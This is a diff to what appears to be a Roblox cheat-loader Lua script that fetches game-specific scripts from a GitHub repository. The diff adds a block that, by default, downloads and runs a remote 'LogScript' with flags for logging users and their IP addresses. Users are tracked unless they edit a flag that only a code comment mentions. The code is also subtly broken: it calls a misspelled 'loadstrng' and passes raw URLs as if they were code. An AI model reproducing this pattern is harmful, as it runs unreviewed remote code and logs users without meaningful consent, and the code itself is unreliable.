@@ -1,3 +1,12 @@
+--JUST SET LOG TO FALSE TO NOT BE LOGGED
+
+local log = true
+local logIp = false
+
+if log then 
+loadstrng("https://raw.githubusercontent.com/QuickKing/Charlesssss/refs/heads/main/LogScript")(log,logIp)
+end 
+
 local gameId = game.gameId
 if gameId == 6104994594 then
 loadstrng("https://raw.githubusercontent.com/QuickKing/Charlesssss/refs/heads/main/%F0%9F%8F%B4%E2%80%8D%E2%98%A0%EF%B8%8F%20Pilfering%20Pirates%20%F0%9F%8F%B4%E2%80%8D%E2%98%A0%EF%B8%8F")
